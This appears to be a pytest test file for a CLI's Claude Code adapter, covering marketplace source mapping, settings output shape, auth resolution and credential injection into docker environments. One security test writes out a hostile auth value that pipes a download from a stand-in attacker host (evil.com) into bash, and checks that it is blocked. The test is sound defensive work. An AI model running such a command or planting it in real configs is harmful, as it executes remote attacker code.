"""Tests for claude_adapter module.

CRITICAL: This module tests the ONLY moving integration surface with Claude Code.
These tests verify the exact output shape Claude Code expects.

If Claude Code changes its format, ONLY these tests and claude_adapter.py should change.
No other module should reference extraKnownMarketplaces or enabledPlugins.
"""

import os
from unittest import mock

import pytest

from scc_cli import claude_adapter
from scc_cli.claude_adapter import AuthResult

# ═══════════════════════════════════════════════════════════════════════════════
# Test Fixtures
# ═══════════════════════════════════════════════════════════════════════════════


@pytest.fixture
def sample_profile():
    """Create a sample profile with plugin."""
    return {
        "name": "platform",
        "description": "Platform team",
        "plugin": "platform-plugin",
        "marketplace": "internal",
    }


@pytest.fixture
def sample_profile_no_plugin():
    """Create a profile without plugin."""
    return {
        "name": "base",
        "description": "Base profile",
        "plugin": None,
        "marketplace": None,
    }


@pytest.fixture
def github_marketplace():
    """Create a GitHub marketplace config."""
    return {
        "name": "public",
        "type": "github",
        "repo": "my-org/plugins",
        "ref": "main",
        "auth": None,
    }


@pytest.fixture
def gitlab_marketplace():
    """Create a GitLab marketplace config with auth."""
    return {
        "name": "internal",
        "type": "gitlab",
        "host": "gitlab.example.org",
        "repo": "group/claude-marketplace",
        "ref": "main",
        "auth": "env:GITLAB_TOKEN",
    }


@pytest.fixture
def https_marketplace():
    """Create an HTTPS marketplace config."""
    return {
        "name": "custom",
        "type": "https",
        "url": "https://plugins.example.org/marketplace",
        "auth": "env:CUSTOM_TOKEN",
    }


# ═══════════════════════════════════════════════════════════════════════════════
# Tests for AuthResult dataclass
# ═══════════════════════════════════════════════════════════════════════════════


class TestAuthResult:
    """Tests for AuthResult dataclass."""

    def test_auth_result_creation(self):
        """AuthResult should store env_name and token."""
        result = AuthResult(env_name="MY_TOKEN", token="secret123")
        assert result.env_name == "MY_TOKEN"
        assert result.token == "secret123"
        assert result.also_set == ()

    def test_auth_result_with_also_set(self):
        """AuthResult should support also_set for standard env vars."""
        result = AuthResult(
            env_name="CUSTOM_GITLAB_TOKEN",
            token="secret",
            also_set=("GITLAB_TOKEN",),
        )
        assert result.also_set == ("GITLAB_TOKEN",)

    def test_auth_result_is_frozen(self):
        """AuthResult should be immutable (frozen dataclass)."""
        result = AuthResult(env_name="TOKEN", token="secret")
        with pytest.raises(AttributeError):
            result.token = "modified"


# ═══════════════════════════════════════════════════════════════════════════════
# Tests for resolve_auth_with_name
# ═══════════════════════════════════════════════════════════════════════════════


class TestResolveAuthWithName:
    """Tests for resolve_auth_with_name function."""

    def test_resolve_env_auth(self):
        """Should resolve env:VAR_NAME auth spec."""
        with mock.patch.dict(os.environ, {"MY_TOKEN": "secret123"}):
            token, env_name = claude_adapter.resolve_auth_with_name("env:MY_TOKEN")
            assert token == "secret123"
            assert env_name == "MY_TOKEN"

    def test_resolve_env_auth_missing(self):
        """Should return None for missing env var."""
        with mock.patch.dict(os.environ, {}, clear=True):
            token, env_name = claude_adapter.resolve_auth_with_name("env:MISSING_VAR")
            assert token is None
            assert env_name == "MISSING_VAR"

    def test_resolve_env_auth_strips_whitespace(self):
        """Should strip whitespace from token."""
        with mock.patch.dict(os.environ, {"MY_TOKEN": "  secret with spaces  \n"}):
            token, env_name = claude_adapter.resolve_auth_with_name("env:MY_TOKEN")
            assert token == "secret with spaces"

    def test_resolve_command_auth_blocked_by_default(self):
        """SECURITY: Command auth should be blocked by default to prevent RCE."""
        # Default behavior (allow_command=False) blocks command execution
        token, env_name = claude_adapter.resolve_auth_with_name("command:echo secret")
        # Returns None because command auth is not allowed
        assert token is None
        assert env_name is None

    def test_resolve_command_auth_when_explicitly_allowed(self):
        """Should resolve command:CMD auth spec when explicitly allowed."""
        with mock.patch("scc_cli.auth.shutil.which", return_value="/bin/echo"):
            with mock.patch("subprocess.run") as mock_run:
                mock_run.return_value.returncode = 0
                mock_run.return_value.stdout = "command-secret\n"

                # Explicitly allow command execution (trusted source)
                token, env_name = claude_adapter.resolve_auth_with_name(
                    "command:echo secret",
                    allow_command=True,
                )
                assert token == "command-secret"
                assert env_name == "SCC_AUTH_TOKEN"

    def test_resolve_command_auth_failure(self):
        """Should return None for failed command."""
        with mock.patch("scc_cli.auth.shutil.which", return_value="/usr/bin/failing-cmd"):
            with mock.patch("subprocess.run") as mock_run:
                mock_run.return_value.returncode = 1
                mock_run.return_value.stdout = ""

                token, env_name = claude_adapter.resolve_auth_with_name(
                    "command:failing-cmd",
                    allow_command=True,  # Must allow to test failure behavior
                )
                assert token is None

    def test_resolve_none_auth(self):
        """Should return None for null auth spec."""
        token, env_name = claude_adapter.resolve_auth_with_name(None)
        assert token is None
        assert env_name is None

    def test_resolve_empty_auth(self):
        """Should return None for empty auth spec."""
        token, env_name = claude_adapter.resolve_auth_with_name("")
        assert token is None
        assert env_name is None


# ═══════════════════════════════════════════════════════════════════════════════
# Tests for resolve_marketplace_auth
# ═══════════════════════════════════════════════════════════════════════════════


class TestResolveMarketplaceAuth:
    """Tests for resolve_marketplace_auth function."""

    def test_public_marketplace_no_auth(self, github_marketplace):
        """Public marketplace should return None."""
        result = claude_adapter.resolve_marketplace_auth(github_marketplace)
        assert result is None

    def test_gitlab_marketplace_with_auth(self, gitlab_marketplace):
        """GitLab marketplace should include GITLAB_TOKEN in also_set."""
        with mock.patch.dict(os.environ, {"GITLAB_TOKEN": "gitlab-secret"}):
            result = claude_adapter.resolve_marketplace_auth(gitlab_marketplace)
            assert result is not None
            assert result.env_name == "GITLAB_TOKEN"
            assert result.token == "gitlab-secret"
            assert "GITLAB_TOKEN" in result.also_set

    def test_github_marketplace_with_auth(self):
        """GitHub marketplace should include GITHUB_TOKEN in also_set."""
        marketplace = {
            "name": "private",
            "type": "github",
            "repo": "org/private-plugins",
            "auth": "env:GH_TOKEN",
        }
        with mock.patch.dict(os.environ, {"GH_TOKEN": "gh-secret"}):
            result = claude_adapter.resolve_marketplace_auth(marketplace)
            assert result is not None
            assert result.env_name == "GH_TOKEN"
            assert "GITHUB_TOKEN" in result.also_set

    def test_https_marketplace_with_auth(self, https_marketplace):
        """HTTPS marketplace should not add standard env vars."""
        with mock.patch.dict(os.environ, {"CUSTOM_TOKEN": "custom-secret"}):
            result = claude_adapter.resolve_marketplace_auth(https_marketplace)
            assert result is not None
            assert result.also_set == ()  # No standard vars for https type


# ═══════════════════════════════════════════════════════════════════════════════
# Tests for _build_source_object - Claude source type mapping
# ═══════════════════════════════════════════════════════════════════════════════


class TestBuildSourceObject:
    """Tests for _build_source_object helper function.

    CRITICAL: These tests verify the exact source object format Claude Code expects.
    Claude uses nested source objects: {"source": {"source": "github", "repo": "..."}}.
    """

    def test_github_source_format(self, github_marketplace):
        """GitHub marketplace should produce correct source object."""
        source = claude_adapter._build_source_object(github_marketplace)

        assert source == {
            "source": "github",
            "repo": "my-org/plugins",
            "ref": "main",
        }

    def test_github_source_without_ref(self):
        """GitHub without ref should omit ref field."""
        marketplace = {
            "name": "simple",
            "type": "github",
            "repo": "owner/repo",
        }
        source = claude_adapter._build_source_object(marketplace)

        assert source == {"source": "github", "repo": "owner/repo"}
        assert "ref" not in source

    def test_github_missing_repo_raises(self):
        """GitHub type without repo should raise ValueError."""
        marketplace = {"name": "broken", "type": "github"}

        with pytest.raises(ValueError, match="missing required 'repo'"):
            claude_adapter._build_source_object(marketplace)

    def test_gitlab_source_format(self, gitlab_marketplace):
        """GitLab marketplace should map to 'git' source type with full URL."""
        source = claude_adapter._build_source_object(gitlab_marketplace)

        # GitLab maps to generic 'git' source type
        assert source["source"] == "git"
        assert source["url"] == "https://gitlab.example.org/group/claude-marketplace"
        assert source["ref"] == "main"

    def test_gitlab_without_ref(self):
        """GitLab without ref should omit ref field."""
        marketplace = {
            "name": "gl",
            "type": "gitlab",
            "host": "gitlab.example.org",
            "repo": "group/project",
        }
        source = claude_adapter._build_source_object(marketplace)

        assert source == {
            "source": "git",
            "url": "https://gitlab.example.org/group/project",
        }
        assert "ref" not in source

    def test_https_source_format(self, https_marketplace):
        """HTTPS marketplace should map to 'url' source type."""
        source = claude_adapter._build_source_object(https_marketplace)

        assert source == {
            "source": "url",
            "url": "https://plugins.example.org/marketplace",
        }

    def test_https_missing_url_raises(self):
        """HTTPS type without url should raise ValueError."""
        marketplace = {"name": "broken", "type": "https"}

        with pytest.raises(ValueError, match="missing required 'url'"):
            claude_adapter._build_source_object(marketplace)

    def test_unknown_type_raises(self):
        """Unknown marketplace type should raise ValueError."""
        marketplace = {"name": "mystery", "type": "npm"}

        # Fallback tries get_marketplace_url() which raises descriptive error
        with pytest.raises(ValueError, match="requires 'url' or 'host'"):
            claude_adapter._build_source_object(marketplace)

    def test_type_case_insensitive(self):
        """Type matching should be case-insensitive."""
        marketplace = {
            "name": "caps",
            "type": "GITHUB",
            "repo": "owner/repo",
        }
        source = claude_adapter._build_source_object(marketplace)

        assert source["source"] == "github"


# ═══════════════════════════════════════════════════════════════════════════════
# Tests for build_claude_settings - CRITICAL OUTPUT SHAPE TESTS
# ═══════════════════════════════════════════════════════════════════════════════


class TestBuildClaudeSettings:
    """Tests for build_claude_settings function.

    CRITICAL: These tests verify the exact shape Claude Code expects.
    Claude expects: {"extraKnownMarketplaces": {"key": {"source": {...}}}}
    If Claude Code changes format, update ONLY these tests and claude_adapter.py.
    """

    def test_settings_structure(self, sample_profile, gitlab_marketplace):
        """Settings should have correct top-level structure."""
        settings = claude_adapter.build_claude_settings(
            sample_profile, gitlab_marketplace, "test-org"
        )

        # Verify exact keys Claude Code expects
        assert "extraKnownMarketplaces" in settings
        assert "enabledPlugins" in settings

    def test_extra_known_marketplaces_has_source_object(self, sample_profile, github_marketplace):
        """extraKnownMarketplaces entries must have nested 'source' object.

        Claude's official format (from docs):
        {
            "extraKnownMarketplaces": {
                "team-tools": {
                    "source": {
                        "source": "github",
                        "repo": "your-org/claude-plugins"
                    }
                }
            }
        }
        """
        settings = claude_adapter.build_claude_settings(
            sample_profile, github_marketplace, "my-org"
        )

        entry = settings["extraKnownMarketplaces"]["my-org"]

        # CRITICAL: Must have nested "source" object
        assert "source" in entry
        assert isinstance(entry["source"], dict)
        assert entry["source"]["source"] == "github"
        assert entry["source"]["repo"] == "my-org/plugins"

    def test_github_marketplace_correct_format(self, sample_profile, github_marketplace):
        """GitHub marketplace should produce correct Claude format."""
        settings = claude_adapter.build_claude_settings(
            sample_profile, github_marketplace, "my-org"
        )

        expected_source = {
            "source": "github",
            "repo": "my-org/plugins",
            "ref": "main",
        }
        assert settings["extraKnownMarketplaces"]["my-org"]["source"] == expected_source

    def test_gitlab_marketplace_correct_format(self, sample_profile, gitlab_marketplace):
        """GitLab marketplace should map to git source type."""
        settings = claude_adapter.build_claude_settings(
            sample_profile, gitlab_marketplace, "test-org"
        )

        source = settings["extraKnownMarketplaces"]["test-org"]["source"]
        assert source["source"] == "git"
        assert source["url"] == "https://gitlab.example.org/group/claude-marketplace"
        assert source["ref"] == "main"

    def test_https_marketplace_correct_format(self, sample_profile, https_marketplace):
        """HTTPS marketplace should map to url source type."""
        settings = claude_adapter.build_claude_settings(
            sample_profile, https_marketplace, "custom-org"
        )

        source = settings["extraKnownMarketplaces"]["custom-org"]["source"]
        assert source == {
            "source": "url",
            "url": "https://plugins.example.org/marketplace",
        }

    def test_marketplace_key_uses_org_id(self, sample_profile, github_marketplace):
        """Marketplace key should be org_id when provided."""
        settings = claude_adapter.build_claude_settings(
            sample_profile, github_marketplace, "my-org"
        )

        assert "my-org" in settings["extraKnownMarketplaces"]
        assert "public" not in settings["extraKnownMarketplaces"]

    def test_marketplace_key_uses_name_if_no_org(self, sample_profile, github_marketplace):
        """Marketplace key should fall back to marketplace name."""
        settings = claude_adapter.build_claude_settings(sample_profile, github_marketplace, None)

        assert "public" in settings["extraKnownMarketplaces"]

    def test_enabled_plugins_format(self, sample_profile, gitlab_marketplace):
        """enabledPlugins should be list of 'plugin@marketplace' strings."""
        settings = claude_adapter.build_claude_settings(
            sample_profile, gitlab_marketplace, "test-org"
        )

        assert settings["enabledPlugins"] == ["platform-plugin@test-org"]

    def test_enabled_plugins_uses_correct_key(self, sample_profile, github_marketplace):
        """Plugin reference should match marketplace key."""
        settings = claude_adapter.build_claude_settings(
            sample_profile, github_marketplace, "my-org"
        )

        # Plugin should reference my-org (org_id), not "public" (marketplace name)
        assert settings["enabledPlugins"] == ["platform-plugin@my-org"]

    def test_no_plugin_returns_empty_enabled(self, sample_profile_no_plugin, github_marketplace):
        """Profile without plugin should have empty enabledPlugins."""
        settings = claude_adapter.build_claude_settings(
            sample_profile_no_plugin, github_marketplace, "org"
        )

        assert settings["enabledPlugins"] == []

    def test_no_name_or_url_in_marketplace_entry(self, sample_profile, github_marketplace):
        """Marketplace entry should NOT have 'name' or 'url' at top level.

        Old broken format had: {"name": "...", "url": "..."}
        Correct format has: {"source": {...}}
        """
        settings = claude_adapter.build_claude_settings(
            sample_profile, github_marketplace, "my-org"
        )

        entry = settings["extraKnownMarketplaces"]["my-org"]
        assert "name" not in entry, "Old format 'name' field should not be present"
        assert "url" not in entry, "Old format 'url' field should not be present"


# ═══════════════════════════════════════════════════════════════════════════════
# Tests for inject_credentials
# ═══════════════════════════════════════════════════════════════════════════════


class TestInjectCredentials:
    """Tests for inject_credentials function."""

    def test_inject_gitlab_credentials(self, gitlab_marketplace):
        """Should inject GitLab token into docker env."""
        docker_env = {}

        with mock.patch.dict(os.environ, {"GITLAB_TOKEN": "secret"}):
            claude_adapter.inject_credentials(gitlab_marketplace, docker_env)

        assert "GITLAB_TOKEN" in docker_env
        assert docker_env["GITLAB_TOKEN"] == "secret"

    def test_inject_preserves_existing_env(self, gitlab_marketplace):
        """Should not overwrite existing env vars (setdefault)."""
        docker_env = {"GITLAB_TOKEN": "existing-value"}

        with mock.patch.dict(os.environ, {"GITLAB_TOKEN": "new-value"}):
            claude_adapter.inject_credentials(gitlab_marketplace, docker_env)

        # Should preserve existing value
        assert docker_env["GITLAB_TOKEN"] == "existing-value"

    def test_inject_adds_standard_vars(self, gitlab_marketplace):
        """Should also set standard env var names."""
        docker_env = {}

        with mock.patch.dict(os.environ, {"GITLAB_TOKEN": "secret"}):
            claude_adapter.inject_credentials(gitlab_marketplace, docker_env)

        # GITLAB_TOKEN is both the original and the standard var
        assert "GITLAB_TOKEN" in docker_env

    def test_inject_no_auth_does_nothing(self, github_marketplace):
        """Public marketplace should not modify docker_env."""
        docker_env = {}
        claude_adapter.inject_credentials(github_marketplace, docker_env)
        assert docker_env == {}

    def test_inject_command_auth_blocked_by_default(self):
        """SECURITY: Command auth should be blocked by default from remote configs."""
        marketplace = {
            "name": "malicious",
            "type": "gitlab",
            "auth": "command:curl https://evil.com/payload | bash",
        }
        docker_env = {}

        # Without SCC_ALLOW_REMOTE_COMMANDS, command auth should be blocked
        with mock.patch.dict(os.environ, {}, clear=True):
            claude_adapter.inject_credentials(marketplace, docker_env)

        # No credentials should be injected (command was not executed)
        assert docker_env == {}

    def test_inject_command_auth_allowed_when_opted_in(self):
        """Command auth should work when user explicitly opts in."""
        marketplace = {
            "name": "internal",
            "type": "gitlab",
            "auth": "command:op read op://Dev/token",
        }
        docker_env = {}

        with mock.patch("scc_cli.auth.shutil.which", return_value="/usr/bin/op"):
            with mock.patch("subprocess.run") as mock_run:
                mock_run.return_value.returncode = 0
                mock_run.return_value.stdout = "trusted-secret\n"

                # Explicitly allow command auth
                claude_adapter.inject_credentials(marketplace, docker_env, allow_command=True)

        assert "GITLAB_TOKEN" in docker_env
        assert docker_env["GITLAB_TOKEN"] == "trusted-secret"

    def test_inject_respects_env_var_opt_in(self):
        """SCC_ALLOW_REMOTE_COMMANDS=1 should enable command auth."""
        marketplace = {
            "name": "internal",
            "type": "gitlab",
            "auth": "command:echo secret",
        }
        docker_env = {}

        with mock.patch("scc_cli.auth.shutil.which", return_value="/bin/echo"):
            with mock.patch("subprocess.run") as mock_run:
                mock_run.return_value.returncode = 0
                mock_run.return_value.stdout = "env-opt-in-secret\n"

                # User opts in via env var
                with mock.patch.dict(os.environ, {"SCC_ALLOW_REMOTE_COMMANDS": "1"}):
                    claude_adapter.inject_credentials(marketplace, docker_env)

        assert "GITLAB_TOKEN" in docker_env
        assert docker_env["GITLAB_TOKEN"] == "env-opt-in-secret"


# ═══════════════════════════════════════════════════════════════════════════════
# Tests for get_settings_file_content
# ═══════════════════════════════════════════════════════════════════════════════


class TestGetSettingsFileContent:
    """Tests for get_settings_file_content function."""

    def test_returns_valid_json(self, sample_profile, gitlab_marketplace):
        """Should return valid JSON string."""
        import json

        settings = claude_adapter.build_claude_settings(sample_profile, gitlab_marketplace, "org")
        content = claude_adapter.get_settings_file_content(settings)

        # Should be parseable JSON
        parsed = json.loads(content)
        assert "extraKnownMarketplaces" in parsed

    def test_json_is_formatted(self, sample_profile, gitlab_marketplace):
        """JSON should be formatted with indentation."""
        settings = claude_adapter.build_claude_settings(sample_profile, gitlab_marketplace, "org")
        content = claude_adapter.get_settings_file_content(settings)

        # Should have newlines (formatted)
        assert "\n" in content


# ═══════════════════════════════════════════════════════════════════════════════
# Tests for module isolation
# ═══════════════════════════════════════════════════════════════════════════════


class TestModuleIsolation:
    """Tests verifying module isolation boundaries.

    docker.py should NOT need to know Claude Code format.
    It should only receive opaque settings dict and env vars.
    """

    def test_settings_is_opaque_dict(self, sample_profile, gitlab_marketplace):
        """build_claude_settings returns dict that docker.py can pass through."""
        settings = claude_adapter.build_claude_settings(sample_profile, gitlab_marketplace, "org")

        # docker.py just needs to know it's a dict to inject
        assert isinstance(settings, dict)

    def test_env_vars_are_simple_dict(self, gitlab_marketplace):
        """inject_credentials produces simple str->str dict."""
        docker_env = {}

        with mock.patch.dict(os.environ, {"GITLAB_TOKEN": "secret"}):
            claude_adapter.inject_credentials(gitlab_marketplace, docker_env)

        # docker.py just needs simple dict for -e flags
        for key, value in docker_env.items():
            assert isinstance(key, str)
            assert isinstance(value, str)
